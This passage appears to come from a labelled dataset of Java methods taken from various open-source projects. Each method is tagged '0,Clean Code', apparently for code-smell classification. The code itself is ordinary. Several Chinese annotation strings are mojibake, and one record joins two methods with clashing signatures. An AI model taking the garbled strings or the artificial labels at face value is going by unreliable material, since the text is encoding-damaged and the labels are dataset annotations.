  if (StrUtil.isEmpty(crmLeads.getEmail())) {
    crmLeads.setEmail(null);
  }
  if (crmLeads.getNextTime() != null) {
    crmLeads.setLastTime(DateUtil.date());
  }
  if (crmLeads.getLeadsId() != null) {
    crmLeads.setCustomerId(0);
    crmLeads.setUpdateTime(DateUtil.date());
    actionRecordUtil.updateRecord(BeanUtil.beanToMap(getById(crmLeads.getLeadsId())),BeanUtil.beanToMap(crmLeads),CrmEnum.LEADS,crmLeads.getLeadsName(),crmLeads.getLeadsId());
    updateById(crmLeads);
    crmLeads=getById(crmLeads.getLeadsId());
    crmBackLogDealService.deleteByType(crmLeads.getOwnerUserId(),CrmEnum.LEADS,CrmBackLogEnum.FOLLOW_LEADS,crmLeads.getLeadsId());
  }
 else {
    crmLeads.setCreateTime(DateUtil.date());
    crmLeads.setUpdateTime(DateUtil.date());
    crmLeads.setCreateUserId(UserUtil.getUserId());
    crmLeads.setIsTransform(0);
    if (!isExcel) {
      crmLeads.setFollowup(0);
    }
    crmLeads.setCreateUserId(UserUtil.getUserId());
    if (crmLeads.getOwnerUserId() == null) {
      crmLeads.setOwnerUserId(UserUtil.getUserId());
    }
    crmLeads.setBatchId(batchId);
    save(crmLeads);
    actionRecordUtil.addRecord(crmLeads.getLeadsId(),CrmEnum.LEADS,crmLeads.getLeadsName());
  }
  crmModel.setEntity(BeanUtil.beanToMap(crmLeads));
  savePage(crmModel,crmLeads.getLeadsId(),isExcel);
}",0,Clean Code
"protected <R>R getConnAndRun(String operator,Map<String,Object> params,Function<C,R> action){
  String cacheKey="""";
  MetadataConnection<C> connection=null;
  try {
    cacheKey=md5String(Json.toJson(params,null),"""",2);
    cacheKey=operator + ""_"" + md5String(Json.toJson(params,null),"""",2);
    if (null != reqCache) {
      ConnectionCache<C> connectionCache=getConnectionInCache(reqCache,cacheKey,() -> getConnection(operator,params));
      connection=connectionCache.connection;
      cacheKey=connectionCache.cacheKey;
    }
 else {
      connection=getConnection(operator,params);
    }
    return run(connection,action);
  }
 catch (  Exception e) {
    LOG.error(""Error to invoke meta service"",e);
    if (StringUtils.isNotBlank(cacheKey) && Objects.nonNull(reqCache)) {
      reqCache.invalidate(cacheKey);
    }
    throw new MetaRuntimeException(e.getMessage(),e);
  }
 finally {
    if (Objects.nonNull(connection) && connection.isLock() && connection.getLock().isHeldByCurrentThread()) {
      connection.getLock().unlock();
    }
  }
}",0,Clean Code
"@ApiOperation(""璺熻繘瀹㈡埛鏁版帓琛屾瀵煎嚭"") @PostMapping(""/customerGenjinCountRanKingExport"") public void customerGenjinCountRanKingExport(@RequestBody BiParams biParams){
  List<JSONObject> objectList=biRankService.customerGenjinCountRanKing(biParams);
  for (int i=0; i < objectList.size(); i++) {
    objectList.get(i).put(""order"",i + 1);
  }
  List<ExcelParseUtil.ExcelDataEntity> dataList=new ArrayList<>();
  dataList.add(ExcelParseUtil.toEntity(""order"",""鍏徃鎬绘帓鍚�""));
  dataList.add(ExcelParseUtil.toEntity(""realname"",""鍛樺伐""));
  dataList.add(ExcelParseUtil.toEntity(""structureName"",""閮ㄩ棬""));
  dataList.add(ExcelParseUtil.toEntity(""count"",""璺熻繘瀹㈡埛鏁帮紙涓級""));
  ExcelParseUtil.exportExcel(objectList,new ExcelParseUtil.ExcelParseService(){
    @Override public void castData(    Map<String,Object> record,    Map<String,Integer> headMap){
    }
    @Override public String getExcelName(){
      return ""璺熻繘瀹㈡埛鏁版帓琛�"";
    }
  }
,dataList);
}",0,Clean Code
"@RequiresApi(api=Build.VERSION_CODES.N) public static Set<Integer> exportAll(String name,Function<IBinder,Object> proxyCreator,Class<?> methodsClass){
  try {
    TransactionCodeExporter exporter=new TransactionCodeExporter(proxyCreator);
    return exporter.exportAll(methodsClass,name);
  }
 catch (  Throwable e) {
    e.printStackTrace();
    return new HashSet<>();
  }
}
public static Set<Integer> exportAll(Class<?> stubClass,Class<?> methodsClass){
  try {
    TransactionCodeExporter exporter=new TransactionCodeExporter(stubClass);
    return exporter.exportAll(methodsClass,stubClass.getName());
  }
 catch (  Throwable e) {
    e.printStackTrace();
    return new HashSet<>();
  }
}
public Set<Integer> exportAll(Class<?> methodsClass,String name){
  Set<Integer> codes=new HashSet<>();
  for (  Method method : methodsClass.getDeclaredMethods()) {
    if (method.getAnnotation(Transaction.class) != null) {
      int transactCode=export(method.getName(),method.getReturnType(),method.getParameterTypes());
      if (transactCode != -1) {
        codes.add(transactCode);
        LOGGER.v(""transact code for %s#%s is %d"",name,method.getName(),transactCode);
      }
 else {
        LOGGER.w(""transact code for %s#%s not found"",name,method.getName());
      }
    }
  }
  return codes;
}",0,Clean Code
"/** 
 * 澶嶅啓go鐨凣etSecureCookie锛堬級鏂规硶
 * @param cookieValue
 * @return
 */
private String parseUserInfoCookie(String cookieValue){
  String secret=gatewayProperties.getAuthCookieKey();
  String[] vals=cookieValue.split(""\\|"",3);
  if (vals.length != 3) {
    return null;
  }
  String vs=vals[0];
  String timestamp=vals[1];
  String sig=vals[2];
  byte[] hmac=new HmacUtils(""HmacSHA1"",secret.getBytes()).hmac(vs + timestamp);
  if (!Objects.equals(sig,Hex.encodeHexString(hmac))) {
    return null;
  }
  return new String(Base64.getUrlDecoder().decode(vs));
}",0,Clean Code
"/** 
 * We can use evenly-sized chunks or unevenly-sized chunks when split table into chunks, using evenly-sized chunks which is much efficient, using unevenly-sized chunks which will request many queries and is not efficient.
 */
private List<ChunkRange> splitTableIntoChunks(JdbcConnection jdbc,TableId tableId,Column splitColumn) throws SQLException {
  final String splitColumnName=splitColumn.name();
  final Object[] minMaxOfSplitColumn=queryMinMax(jdbc,tableId,splitColumnName);
  final Object min=minMaxOfSplitColumn[0];
  final Object max=minMaxOfSplitColumn[1];
  if (min == null || max == null || min.equals(max)) {
    return Collections.singletonList(ChunkRange.all());
  }
  final int chunkSize=sourceConfig.getSplitSize();
  final double distributionFactorUpper=sourceConfig.getDistributionFactorUpper();
  final double distributionFactorLower=sourceConfig.getDistributionFactorLower();
  if (isEvenlySplitColumn(splitColumn)) {
    long approximateRowCnt=queryApproximateRowCnt(jdbc,tableId);
    double distributionFactor=calculateDistributionFactor(tableId,min,max,approximateRowCnt);
    boolean dataIsEvenlyDistributed=doubleCompare(distributionFactor,distributionFactorLower) >= 0 && doubleCompare(distributionFactor,distributionFactorUpper) <= 0;
    if (dataIsEvenlyDistributed) {
      final int dynamicChunkSize=Math.max((int)(distributionFactor * chunkSize),1);
      return splitEvenlySizedChunks(tableId,min,max,approximateRowCnt,dynamicChunkSize);
    }
 else {
      return splitUnevenlySizedChunks(jdbc,tableId,splitColumnName,min,max,chunkSize);
    }
  }
 else {
    return splitUnevenlySizedChunks(jdbc,tableId,splitColumnName,min,max,chunkSize);
  }
}",0,Clean Code
"private int parsePayloadLengthInfo(ParsableBitArray data) throws ParserException {
  int muxSlotLengthBytes=0;
  if (frameLengthType == 0) {
    int tmp;
    do {
      tmp=data.readBits(8);
      muxSlotLengthBytes+=tmp;
    }
 while (tmp == 255);
    return muxSlotLengthBytes;
  }
 else {
    throw new ParserException();
  }
}",0,Clean Code
"/** 
 * Releases  {@link #keepSessionIdAudioTrack} asynchronously, if it is non-{@code null}.
 */
private void releaseKeepSessionIdAudioTrack(){
  if (keepSessionIdAudioTrack == null) {
    return;
  }
  final AudioTrack toRelease=keepSessionIdAudioTrack;
  keepSessionIdAudioTrack=null;
  new Thread(){
    @Override public void run(){
      log.i(""audioTrack.release"");
      toRelease.release();
    }
  }
.start();
}
",0,Clean Code
"public RequestsUtil isSuccessful() throws IOException {
  if (!response.isSuccessful()) {
    throw new IOException(String.format(""response is not successful: %s; retBody: %s"",response.toString(),getString()));
  }
  ResponseBody body=response.body();
  if (body != null) {
    JSONObject jsonObject=new JSONObject();
    try {
      jsonObject=JSONObject.parseObject(responseBodyString);
    }
 catch (    Exception ignored) {
    }
    if (jsonObject.getLongValue(""code"") >= 300) {
      throw new IOException(String.format(""response is not successful: %s; retBody: %s"",response.toString(),getString()));
    }
  }
  return this;
}",0,Clean Code
"void bindControlToAction(int position,Presenter presenter){
  bindControlToAction(position,getDisplayedAdapter(),presenter);
}
private void bindControlToAction(final int position,ObjectAdapter adapter,Presenter presenter){
  Presenter.ViewHolder vh=mViewHolders.get(position);
  Object item=adapter.get(position);
  if (vh == null) {
    vh=presenter.onCreateViewHolder(mControlBar);
    mViewHolders.put(position,vh);
    final Presenter.ViewHolder itemViewHolder=vh;
    presenter.setOnClickListener(vh,new View.OnClickListener(){
      @Override public void onClick(      View v){
        Object item=getDisplayedAdapter().get(position);
        if (mOnControlClickedListener != null) {
          mOnControlClickedListener.onControlClicked(itemViewHolder,item,mData);
        }
      }
    }
);
  }
  if (vh.view.getParent() == null) {
    mControlBar.addView(vh.view);
  }
  presenter.onBindViewHolder(vh,item);
}
",0,Clean Code
"private boolean removeConfigInner(String tenant,String dataId,String group,String tag) throws NacosException {
  group=null2defaultGroup(group);
  ParamUtils.checkKeyParam(dataId,group);
  String url=Constants.CONFIG_CONTROLLER_PATH;
  List<String> params=new ArrayList<String>();
  params.add(""dataId"");
  params.add(dataId);
  params.add(""group"");
  params.add(group);
  if (StringUtils.isNotEmpty(tenant)) {
    params.add(""tenant"");
    params.add(tenant);
  }
  if (StringUtils.isNotEmpty(tag)) {
    params.add(""tag"");
    params.add(tag);
  }
  HttpResult result=null;
  try {
    result=agent.httpDelete(url,null,params,encode,POST_TIMEOUT);
  }
 catch (  IOException ioe) {
    LOGGER.warn(""[remove] error, "" + dataId + "", ""+ group+ "", ""+ tenant+ "", msg: ""+ ioe.toString());
    return false;
  }
  if (HttpURLConnection.HTTP_OK == result.code) {
    LOGGER.info(""[{}] [remove] ok, dataId={}, group={}, tenant={}"",agent.getName(),dataId,group,tenant);
    return true;
  }
 else   if (HttpURLConnection.HTTP_FORBIDDEN == result.code) {
    LOGGER.warn(""[{}] [remove] error, dataId={}, group={}, tenant={}, code={}, msg={}"",agent.getName(),dataId,group,tenant,result.code,result.content);
    throw new NacosException(result.code,result.content);
  }
 else {
    LOGGER.warn(""[{}] [remove] error, dataId={}, group={}, tenant={}, code={}, msg={}"",agent.getName(),dataId,group,tenant,result.code,result.content);
    return false;
  }
}",0,Clean Code
"private void importKeystore(List<ChildNumber> derivation){
  importButton.setDisable(true);
  try {
    Keystore keystore=importer.getKeystore(derivation,xprv);
    EventManager.get().post(new KeystoreImportEvent(keystore));
  }
 catch (  ImportException e) {
    String errorMessage=e.getMessage();
    if (e.getCause() != null && e.getCause().getMessage() != null && !e.getCause().getMessage().isEmpty()) {
      errorMessage=e.getCause().getMessage();
    }
    setError(""Import Error"",errorMessage);
    importButton.setDisable(false);
  }
}
",0,Clean Code
"@Override protected void onCreate(Bundle savedInstanceState){
  super.onCreate(savedInstanceState);
  ChatThemeController chatThemeController=ChatThemeController.getInstance(currentAccount);
  chatThemeController.preloadAllWallpaperThumbs(true);
  chatThemeController.preloadAllWallpaperThumbs(false);
  chatThemeController.preloadAllWallpaperImages(true);
  chatThemeController.preloadAllWallpaperImages(false);
  NotificationCenter.getGlobalInstance().addObserver(this,NotificationCenter.emojiLoaded);
  isApplyClicked=false;
  List<EmojiThemes> cachedThemes=themeDelegate.getCachedThemes();
  if (cachedThemes == null || cachedThemes.isEmpty()) {
    chatThemeController.requestAllChatThemes(new ResultCallback<List<EmojiThemes>>(){
      @Override public void onComplete(      List<EmojiThemes> result){
        if (result != null && !result.isEmpty()) {
          themeDelegate.setCachedThemes(result);
        }
        NotificationCenter.getInstance(currentAccount).doOnIdle(() -> {
          onDataLoaded(result);
        }
);
      }
      @Override public void onError(      TLRPC.TL_error error){
        Toast.makeText(getContext(),error.text,Toast.LENGTH_SHORT).show();
      }
    }
,true);
  }
 else {
    onDataLoaded(cachedThemes);
  }
  if (chatActivity.getCurrentUser() != null && SharedConfig.dayNightThemeSwitchHintCount > 0 && !chatActivity.getCurrentUser().self) {
    SharedConfig.updateDayNightThemeSwitchHintCount(SharedConfig.dayNightThemeSwitchHintCount - 1);
    hintView=new HintView(getContext(),9,chatActivity.getResourceProvider());
    hintView.setVisibility(View.INVISIBLE);
    hintView.setShowingDuration(5000);
    hintView.setBottomOffset(-dp(8));
    if (forceDark) {
      hintView.setText(AndroidUtilities.replaceTags(LocaleController.formatString(""ChatThemeDaySwitchTooltip"",R.string.ChatThemeDaySwitchTooltip)));
    }
 else {
      hintView.setText(AndroidUtilities.replaceTags(LocaleController.formatString(""ChatThemeNightSwitchTooltip"",R.string.ChatThemeNightSwitchTooltip)));
    }
    AndroidUtilities.runOnUIThread(() -> {
      hintView.showForView(darkThemeView,true);
    }
,1500);
    container.addView(hintView,LayoutHelper.createFrame(LayoutHelper.WRAP_CONTENT,LayoutHelper.WRAP_CONTENT,Gravity.LEFT | Gravity.TOP,10,0,10,0));
  }
}",0,Clean Code
"private void loadRandomNext(){
  MediaServiceManager.instance().disposeActions();
  if (getPlayer() == null || mPlayerData == null || mLastVideo == null || mLastVideo.playlistInfo == null) {
    return;
  }
  if (mPlayerData.getRepeatMode() == PlayerUI.REPEAT_MODE_SHUFFLE) {
    Video video=new Video();
    video.playlistId=mLastVideo.playlistId;
    VideoGroup topRow=getPlayer().getSuggestionsByIndex(0);
    video.playlistIndex=mRandom.getPlaylistIndex(mLastVideo.getPlaylistId(),mLastVideo.playlistInfo.getSize() != -1 ? mLastVideo.playlistInfo.getSize() : topRow != null ? topRow.getVideos().size() : -1);
    MediaServiceManager.instance().loadMetadata(video,randomMetadata -> {
      if (randomMetadata.getNextVideo() == null) {
        return;
      }
      if (mLastVideo.nextMediaItemBackup == null) {
        mLastVideo.nextMediaItemBackup=mLastVideo.nextMediaItem;
      }
      mLastVideo.nextMediaItem=SampleMediaItem.from(randomMetadata);
      getPlayer().setNextTitle(mLastVideo.nextMediaItem.getTitle());
    }
);
  }
 else   if (mLastVideo.nextMediaItemBackup != null) {
    mLastVideo.nextMediaItem=mLastVideo.nextMediaItemBackup;
    getPlayer().setNextTitle(mLastVideo.nextMediaItem.getTitle());
  }
}",0,Clean Code
"public boolean isValidLicense(String license){
  if (license.isEmpty())   return false;
  try {
    byte[] data=Utils.base32Decode(license);
    if ((data.length != 60) || (data[0] != 'v') || (data[1] != '1'))     return false;
    KeyFactory keyFactory=KeyFactory.getInstance(""EC"");
    PublicKey pk=keyFactory.generatePublic(new X509EncodedKeySpec(android.util.Base64.decode(KEY,android.util.Base64.DEFAULT)));
    Signature sig=Signature.getInstance(""SHA1withECDSA"");
    sig.initVerify(pk);
    String msg=SUPPORTER_SKU + ""@"" + getInstallationId();
    sig.update(msg.getBytes(StandardCharsets.US_ASCII));
    return sig.verify(getASN1(data,4));
  }
 catch (  NoSuchAlgorithmException|InvalidKeySpecException|InvalidKeyException|SignatureException|IllegalArgumentException e) {
    Log.d(TAG,e.getMessage());
    return false;
  }
}",0,Clean Code
"static void cancelStatusNotification(){
  try {
    var nm=getNotificationManager();
    createNotificationChannel(nm);
    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
      nm.cancelNotificationWithTag(""android"",""android"",null,STATUS_NOTIFICATION_ID,0);
    }
 else {
      nm.cancelNotificationWithTag(""android"",null,STATUS_NOTIFICATION_ID,0);
    }
  }
 catch (  RemoteException e) {
    Log.e(TAG,""cancelStatusNotification: "",e);
  }
}",0,Clean Code
"/** 
 * Calculates the Peak-Signal-to-Noise-Ratio value for 2 bitmaps. <p>This is the logarithmic decibel(dB) value of the average mean-squared-error of normalized (0.0-1.0) R/G/B values from the two bitmaps. The higher the value, the more similar they are.
 * @param firstBitmap The first bitmap.
 * @param secondBitmap The second bitmap.
 * @return The PSNR value calculated from these 2 bitmaps.
 */
private static double getPsnr(Bitmap firstBitmap,Bitmap secondBitmap){
  assertThat(firstBitmap.getWidth()).isEqualTo(secondBitmap.getWidth());
  assertThat(firstBitmap.getHeight()).isEqualTo(secondBitmap.getHeight());
  long mse=0;
  for (int i=0; i < firstBitmap.getWidth(); i++) {
    for (int j=0; j < firstBitmap.getHeight(); j++) {
      int firstColorInt=firstBitmap.getPixel(i,j);
      int firstRed=Color.red(firstColorInt);
      int firstGreen=Color.green(firstColorInt);
      int firstBlue=Color.blue(firstColorInt);
      int secondColorInt=secondBitmap.getPixel(i,j);
      int secondRed=Color.red(secondColorInt);
      int secondGreen=Color.green(secondColorInt);
      int secondBlue=Color.blue(secondColorInt);
      mse+=((firstRed - secondRed) * (firstRed - secondRed) + (firstGreen - secondGreen) * (firstGreen - secondGreen) + (firstBlue - secondBlue) * (firstBlue - secondBlue));
    }
  }
  double normalizedMse=mse / (255.0 * 255.0 * 3.0* firstBitmap.getWidth()* firstBitmap.getHeight());
  return 10 * Math.log10(1.0 / normalizedMse);
}",0,Clean Code
"@Test(timeout=20 * TIME_OUT) public void subscribeEmpty() throws Exception {
  String serviceName=randomDomainName();
  naming.subscribe(serviceName,new EventListener(){
    @Override public void onEvent(    Event event){
      System.out.println(((NamingEvent)event).getServiceName());
      System.out.println(((NamingEvent)event).getInstances());
      instances=((NamingEvent)event).getInstances();
    }
  }
);
  naming.registerInstance(serviceName,""1.1.1.1"",TEST_PORT,""c1"");
  while (instances.isEmpty()) {
    Thread.sleep(1000L);
  }
  Assert.assertTrue(verifyInstanceList(instances,naming.getAllInstances(serviceName)));
  naming.deregisterInstance(serviceName,""1.1.1.1"",TEST_PORT,""c1"");
  while (!instances.isEmpty()) {
    Thread.sleep(1000L);
  }
  Assert.assertEquals(0,instances.size());
  Assert.assertEquals(0,naming.getAllInstances(serviceName).size());
}",0,Clean Code
"private static boolean markState(FragmentManager manager,Lifecycle.State state){
  boolean hadNotMarked=false;
  Collection<Fragment> fragments=manager.getFragments();
  for (  Fragment fragment : fragments) {
    if (fragment == null) {
      continue;
    }
    if (fragment.getLifecycle().getCurrentState().isAtLeast(Lifecycle.State.STARTED)) {
      fragment.mLifecycleRegistry.setCurrentState(state);
      hadNotMarked=true;
    }
    if (fragment.getHost() != null) {
      FragmentManager childFragmentManager=fragment.getChildFragmentManager();
      hadNotMarked|=markState(childFragmentManager,state);
    }
  }
  return hadNotMarked;
}
",0,Clean Code
"@SuppressWarnings(""TryWithIdenticalCatches"") public static void registerOnActivityDestroyListener(Preference preference,PreferenceManager.OnActivityDestroyListener listener){
  if (null == mRegisterOnActivityDestroyListener || null == preference || null == listener) {
    return;
  }
  PreferenceManager preferenceManager=preference.getPreferenceManager();
  if (null == preferenceManager) {
    return;
  }
  try {
    mRegisterOnActivityDestroyListener.invoke(preferenceManager,listener);
  }
 catch (  IllegalAccessException e) {
    e.printStackTrace();
  }
catch (  InvocationTargetException e) {
    e.printStackTrace();
  }
}
",0,Clean Code
"@Override public BasePage<com.kakarote.core.feign.oa.entity.ExamineVO> queryOaExamineList(ExaminePageBO examinePageBo){
  UserInfo user=UserUtil.getUser();
  if (examinePageBo.getCategoryId() != null) {
    Examine examine=getById(examinePageBo.getCategoryId());
    examinePageBo.setCategoryId(examine != null ? examine.getExamineInitId().intValue() : null);
  }
  examinePageBo.setLabel(0);
  BasePage<ExamineRecord> basePage=examineRecordLogMapper.selectRecordLogListByUser(examinePageBo.parse(),examinePageBo,user.getUserId(),user.getRoles());
  BasePage<com.kakarote.core.feign.oa.entity.ExamineVO> page=new BasePage<>(basePage.getCurrent(),basePage.getSize(),basePage.getTotal(),basePage.isSearchCount());
  List<com.kakarote.core.feign.oa.entity.ExamineVO> examineVoList=new ArrayList<>();
  for (  ExamineRecord examineRecord : basePage.getList()) {
    Integer typeId=examineRecord.getTypeId();
    if (typeId == null) {
      continue;
    }
    com.kakarote.core.feign.oa.entity.ExamineVO examineVO=oaService.getOaExamineById(typeId).getData();
    examineVO.setCreateTime(examineRecord.getCreateTime());
    examineVoList.add(examineVO);
  }
  page.setList(examineVoList);
  return page;
}",0,Clean Code
"/** 
 * Determines if the input code point should be considered a character that is punctuation. This will return true for all ascii characters that are not letters or digits and for any character whose Character type is defined as punctuation.  See  {@link Character#getType(int)}.
 * @param codepoint The codepoint to check.
 * @return True if the codepoint is punctuation, false otherwise.
 */
public static boolean isPunctuation(int codepoint){
  if (codepoint >= 33 && codepoint <= 47) {
    return true;
  }
  if (codepoint >= 58 && codepoint <= 64) {
    return true;
  }
  if (codepoint >= 91 && codepoint <= 96) {
    return true;
  }
  if (codepoint >= 123 && codepoint <= 126) {
    return true;
  }
  int charType=Character.getType(codepoint);
  if (charType == Character.DASH_PUNCTUATION || charType == Character.START_PUNCTUATION || charType == Character.END_PUNCTUATION || charType == Character.CONNECTOR_PUNCTUATION || charType == Character.OTHER_PUNCTUATION || charType == Character.INITIAL_QUOTE_PUNCTUATION || charType == Character.FINAL_QUOTE_PUNCTUATION) {
    return true;
  }
  return false;
}",0,Clean Code
"public static void setConfig(SaTokenConfig config){
  setConfigMethod(config);
  if (config != null && config.getIsPrint()) {
    SaFoxUtil.printSaToken();
  }
  if (config != null && config.getIsLog() != null && config.getIsLog() && config.getIsColorLog() == null) {
    config.setIsColorLog(SaFoxUtil.isCanColorLog());
  }
  SaTokenEventCenter.doSetConfig(config);
  StpUtil.getLoginType();
}
",0,Clean Code
"@Override public String buildOrderBySql(String originSql,List<OrderBy> orderByList){
  if (CollectionUtils.isEmpty(orderByList)) {
    return originSql;
  }
  try {
    Statement statement=CCJSqlParserUtil.parse(originSql);
    if (statement instanceof Select) {
      Select selectStatement=(Select)statement;
      PlainSelect plainSelect=(PlainSelect)selectStatement.getSelectBody();
      List<OrderByElement> orderByElements=new ArrayList<>();
      for (      OrderBy orderBy : orderByList) {
        OrderByElement orderByElement=new OrderByElement();
        orderByElement.setExpression(CCJSqlParserUtil.parseExpression(orderBy.getColumnName()));
        orderByElement.setAsc(orderBy.isAsc());
        orderByElements.add(orderByElement);
      }
      plainSelect.setOrderByElements(orderByElements);
      return plainSelect.toString();
    }
  }
 catch (  Exception e) {
  }
  return originSql;
}
",0,Clean Code
"/** 
 * Used by the OLCUT configuration system, and should not be called by external code.
 */
@Override public void postConfig(){
  if ((dummyType == DummyType.CONSTANT) && (Double.isNaN(constantValue))) {
    throw new PropertyException("""",""constantValue"",""Please supply a constant value when using the type CONSTANT."");
  }
  if ((dummyType == DummyType.QUARTILE) && ((quartile < 0.) || (quartile > 1.0))) {
    throw new PropertyException("""",""quartile"",""Please supply a quartile between zero and one when using the type QUARTILE."");
  }
}",0,Clean Code
"/** 
 * Gets the complete register list (result and sources) out of a given rop instruction. For insns that are commutative, have two register sources, and have a source equal to the result, place that source first.
 * @param insn {@code non-null;} instruction in question
 * @return {@code non-null;} the instruction's complete register list
 */
private static RegisterSpecList getRegs(Insn insn){
  return getRegs(insn,insn.getResult());
}
/** 
 * Gets the complete register list (result and sources) out of a given rop instruction. For insns that are commutative, have two register sources, and have a source equal to the result, place that source first.
 * @param insn {@code non-null;} instruction in question
 * @param resultReg {@code null-ok;} the real result to use (ignore the insn's)
 * @return {@code non-null;} the instruction's complete register list
 */
private static RegisterSpecList getRegs(Insn insn,RegisterSpec resultReg){
  RegisterSpecList regs=insn.getSources();
  if (insn.getOpcode().isCommutative() && (regs.size() == 2) && (resultReg.getReg() == regs.get(1).getReg())) {
    regs=RegisterSpecList.make(regs.get(1),regs.get(0));
  }
  if (resultReg == null) {
    return regs;
  }
  return regs.withFirst(resultReg);
}",0,Clean Code
"@Override public boolean onInterceptTouchEvent(MotionEvent ev){
  if (!isInAllApps()) {
    mTouchHandler=null;
    return false;
  }
  if (ev.getAction() == MotionEvent.ACTION_DOWN) {
    AllAppsRecyclerView rv=getActiveRecyclerView();
    if (rv != null && rv.getScrollbar() != null && rv.getScrollbar().isHitInParent(ev.getX(),ev.getY(),mFastScrollerOffset)) {
      mTouchHandler=rv.getScrollbar();
    }
 else {
      mTouchHandler=null;
    }
  }
  if (mTouchHandler != null) {
    return mTouchHandler.handleTouchEvent(ev,mFastScrollerOffset);
  }
  return false;
}
",0,Clean Code
"@PostMapping(""/downLoadFixTemplate"") @ApiOperation(""涓嬭浇瀹氳柂妯℃澘"") public void downLoadFixTemplate(@RequestBody QuerySalaryArchivesListBO querySalaryArchivesListBO,HttpServletResponse response) throws IOException {
  List<ExcelTemplateOption> templateOptionList=salaryArchivesService.queryFixSalaryExcelExportOption();
  querySalaryArchivesListBO.setPageType(0);
  querySalaryArchivesListBO.setStatus(11);
  List<QuerySalaryArchivesListVO> employeeList=salaryArchivesService.querySalaryArchivesList(querySalaryArchivesListBO).getList();
  try (InputStream inputStream=this.getClass().getClassLoader().getResourceAsStream(""fixTemplate.xlsx"");XSSFWorkbook wb=new XSSFWorkbook(inputStream);ServletOutputStream out=response.getOutputStream()){
    int colNum=7;
    int rowNum=7;
    XSSFSheet sheet=wb.getSheetAt(0);
    XSSFRow row5=sheet.getRow(5);
    XSSFRow row6=sheet.getRow(6);
    for (    ExcelTemplateOption categoryOption : templateOptionList) {
      List<ExcelTemplateOption> optionList=categoryOption.getOptionList();
      if (CollUtil.isEmpty(optionList)) {
        continue;
      }
      if (optionList.size() > 1) {
        sheet.addMergedRegion(new CellRangeAddress(row5.getRowNum(),row5.getRowNum(),colNum,colNum + optionList.size() - 1));
      }
      SalaryExcelUtil.createHeadCell(wb,row5,colNum,categoryOption.getName());
      for (int i=0; i < optionList.size(); i++) {
        ExcelTemplateOption option=optionList.get(i);
        SalaryExcelUtil.createHeadCell(wb,row6,colNum + i,option.getName());
      }
      colNum+=optionList.size();
    }
    sheet.addMergedRegion(new CellRangeAddress(row5.getRowNum(),row6.getRowNum(),colNum,colNum));
    SalaryExcelUtil.createHeadCell(wb,row5,colNum,""澶囨敞"");
    for (int i=0; i < employeeList.size(); i++) {
      QuerySalaryArchivesListVO employeeArchives=employeeList.get(i);
      XSSFRow row=sheet.createRow(rowNum + i);
      SalaryExcelUtil.createBodyCell(wb,row,0,employeeArchives.getEmployeeName());
      SalaryExcelUtil.createBodyCell(wb,row,1,employeeArchives.getJobNumber());
      SalaryExcelUtil.createBodyCell(wb,row,2,employeeArchives.getDeptName());
      SalaryExcelUtil.createBodyCell(wb,row,3,employeeArchives.getPost());
    }
    response.setContentType(""application/vnd.ms-excel;charset=utf-8"");
    response.setCharacterEncoding(""UTF-8"");
    response.setHeader(""Content-Disposition"",""attachment;filename=fixSalaryTemplate.xlsx"");
    wb.write(out);
  }
 }",0,Clean Code
"private void sslkeyfileExportResult(final ActivityResult result){
  if ((result.getResultCode() == RESULT_OK) && (result.getData() != null) && (mKeylogFile != null)) {
    try (OutputStream out=getContentResolver().openOutputStream(result.getData().getData(),""rwt"")){
      Utils.copy(mKeylogFile,out);
      Utils.showToast(this,R.string.save_ok);
    }
 catch (    IOException e) {
      e.printStackTrace();
      Utils.showToastLong(this,R.string.export_failed);
    }
  }
  if (mKeylogFile != null) {
    mKeylogFile.delete();
    mKeylogFile=null;
  }
}
",0,Clean Code
"/** 
 * Sets the minimum number of times that a download will be retried. A download will fail if the specified number of retries is exceeded without any progress being made.
 * @param minRetryCount The minimum number of times that a download will be retried.
 */
public void setMinRetryCount(int minRetryCount){
  Assertions.checkArgument(minRetryCount >= 0);
  if (this.minRetryCount == minRetryCount) {
    return;
  }
  this.minRetryCount=minRetryCount;
  pendingMessages++;
  internalHandler.obtainMessage(MSG_SET_MIN_RETRY_COUNT,minRetryCount,0).sendToTarget();
}
private void setMinRetryCount(int minRetryCount){
  this.minRetryCount=minRetryCount;
}",0,Clean Code
"public boolean isSpeakerphoneOn(){
  if (USE_CONNECTION_SERVICE && systemCallConnection != null && systemCallConnection.getCallAudioState() != null) {
    int route=systemCallConnection.getCallAudioState().getRoute();
    return hasEarpiece() ? route == CallAudioState.ROUTE_SPEAKER : route == CallAudioState.ROUTE_BLUETOOTH;
  }
 else   if (audioConfigured && !USE_CONNECTION_SERVICE) {
    AudioManager am=(AudioManager)getSystemService(AUDIO_SERVICE);
    return hasEarpiece() ? am.isSpeakerphoneOn() : am.isBluetoothScoOn();
  }
  return speakerphoneStateToSet;
}
",0,Clean Code
"public static boolean isCygwinOrMinGW(){
  if (isWindows()) {
    if ((System.getenv(""MSYSTEM"") != null && System.getenv(""MSYSTEM"").startsWith(""MINGW"")) || ""/bin/bash"".equals(System.getenv(""SHELL""))) {
      return true;
    }
  }
  return false;
}
",0,Clean Code
"@Override public int getEmojiPadding(boolean panned){
  if (translateBottomPanelAfterResize && panned) {
    bottomPanelTranslationY(0,1);
  }
  if (keyboardVisible && translateBottomPanelAfterResize && !panned) {
    return 0;
  }
  return emojiPadding;
}",0,Clean Code
"public Bitmap getNextFrame(){
  if (nativePtr == 0) {
    return backgroundBitmap;
  }
  if (backgroundBitmap == null) {
    backgroundBitmap=Bitmap.createBitmap((int)(metaData[0] * scaleFactor),(int)(metaData[1] * scaleFactor),Bitmap.Config.ARGB_8888);
  }
  getVideoFrame(nativePtr,backgroundBitmap,metaData,backgroundBitmap.getRowBytes(),false,startTime,endTime);
  return backgroundBitmap;
}
@Override public int getNextFrame(Bitmap bitmap){
  if (cacheGenerateNativePtr == 0) {
    return -1;
  }
  Canvas canvas=new Canvas(bitmap);
  if (generatingCacheBitmap == null) {
    generatingCacheBitmap=Bitmap.createBitmap(metaData[0],metaData[1],Bitmap.Config.ARGB_8888);
  }
  getVideoFrame(cacheGenerateNativePtr,generatingCacheBitmap,metaData,generatingCacheBitmap.getRowBytes(),false,startTime,endTime);
  if (cacheGenerateTimestamp != 0 && (metaData[3] == 0 || cacheGenerateTimestamp > metaData[3])) {
    return 0;
  }
  if (lastMetadata == metaData[3]) {
    tryCount++;
    if (tryCount > 5) {
      return 0;
    }
  }
  lastMetadata=metaData[3];
  bitmap.eraseColor(Color.TRANSPARENT);
  canvas.save();
  float s=(float)renderingWidth / generatingCacheBitmap.getWidth();
